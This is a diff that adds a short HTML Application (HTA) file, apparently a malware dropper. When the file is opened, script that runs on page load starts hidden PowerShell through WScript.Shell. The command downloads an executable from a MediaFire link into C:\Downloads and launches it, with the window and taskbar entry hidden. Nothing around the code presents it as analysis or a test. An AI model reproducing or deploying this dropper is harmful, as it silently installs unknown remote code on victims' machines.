@@ -1,0 +1,18 @@
+<html>
+<head>
+<center style="padding-top: 4px;">
+ <hta:application id="app" applicationname="" border="thin" borderstyle="normal" caption="yes" contextmenu="no" innerborder="no" maximizebutton="no" minimizebutton="no" navigable="no" scroll="no" showintaskbar="no" singleinstance="no" sysmenu="yes" version= "1.0" windowstate="hidden" />
+ <script language="javascript" type="text/javascript">
+  function executeCommand() {
+        var command = 'powershell.exe -WindowStyle hidden -Command "New-Item -ItemType Directory -Force -Path C:\\Downloads; Invoke-WebRequest -Uri https://download1979.mediafire.com/xc6d0pbvcg1gX-wq4JDe1g8S4gGm4-92fIVgi_7HGiPFCWDU-roq0Fs6dVQYwyKT4cCgXXK7Hwt3IylEZzjte0B8_5yUtGQ0LQDk3rPUgRJC8cez7Bq3YXgGgr86XZvjdVNVc9A66FyTyfDHsvTJ76dA9cmz49xaRcHusDabQJ8eBGA4/cpsxj3cndvskiha/rA9XA4acd7.exe -OutFile C:\\Downloads\\rA9XA4acd7.exe; Start-Process -FilePath C:\\Downloads\\rA9XA4acd7"';
+        var shell = new ActiveXObject("WScript.Shell");
+        shell.Run("cmd.exe /c " + command, 1, true);
+      }
+
+      window.onload = function() {
+          executeCommand();
+      }
+    </script>
+  </head>
+</body>
+</html>
